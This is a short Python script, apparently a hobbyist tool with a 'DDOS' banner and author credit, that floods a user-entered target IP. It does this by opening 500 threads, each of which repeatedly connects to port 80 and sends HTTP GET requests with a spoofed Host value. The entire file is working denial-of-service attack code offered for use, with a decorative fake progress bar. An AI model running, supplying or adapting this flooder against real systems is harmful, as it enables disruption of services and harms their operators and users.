import socket,os,time
import threading
from colorama import Fore,init
init()
 
RESET = Fore.RESET

def banner():
    os.system("cls" or "clear")
    print(Fore.CYAN+"""
  _____      _____       _____     ______  
 /\ __/\    /\ __/\     ) ___ (   / ____/\ 
 ) )  \ \   ) )  \ \   / /\_/\ \  ) ) __\/ 
/ / /\ \ \ / / /\ \ \ / /_/ (_\ \  \ \ \   
\ \ \/ / / \ \ \/ / / \ \ )_/ / /  _\ \ \  
 ) )__/ /   ) )__/ /   \ \/_\/ /  )____) ) 
 \/___\/    \/___\/     )_____(   \____\/  

                version : 1.0
                Coded By abolfazlkheiri
                https://www.youtube.com/channel/UC28VIdKjc3DJNxgIL5vqCzA
    
    """+RESET)

banner()

target = input("Enter Target ip : \n ")
fake_ip = "40.56.10.2"
port = 80

counter = 0

def attack():
     while True:
        s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.connect((target,port))
        s.sendto(("GET /"+target+"HTTP/1.1\r\n").encode("ascii"),(target,port))
        s.sendto(("Host:"+fake_ip+"\r\n\r\n").encode("ascii"),(target,port))

        global counter
        counter += 1
        print(f" {Fore.GREEN} Pcket {str(counter) } sent !  \n")
        s.close()

print(" [       ] 0%")
time.sleep(1)
print(" [=======   ] 20%")
time.sleep(1)
print(" [============ ] 40%")
time.sleep(1)
print(" [================ ] 60%")
time.sleep(1)
print(" [==================== ] 80%")
time.sleep(1)
print(" [========================= ] 100%")
time.sleep(1)
print("Attack Start ....")
time.sleep(1)

for i in range(500):
    thread = threading.Thread(target=attack)
    thread.start()    